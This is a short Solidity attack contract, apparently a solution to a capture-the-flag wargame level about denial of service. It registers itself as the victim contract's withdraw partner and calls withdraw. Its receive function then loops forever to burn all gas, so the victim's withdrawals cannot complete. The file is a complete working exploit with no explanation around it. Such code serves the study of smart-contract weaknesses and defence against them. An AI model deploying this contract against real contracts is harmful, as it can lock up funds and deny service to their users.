// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external; 
}

contract DenyWithdraw {
    address victim;

    function pwn(address _victim) external payable {
        victim = _victim;
        IDenial(victim).setWithdrawPartner(address(this));
        IDenial(victim).withdraw();
    }

    receive() external payable {
        // Consume all gas
        while (true) {}
    }
}
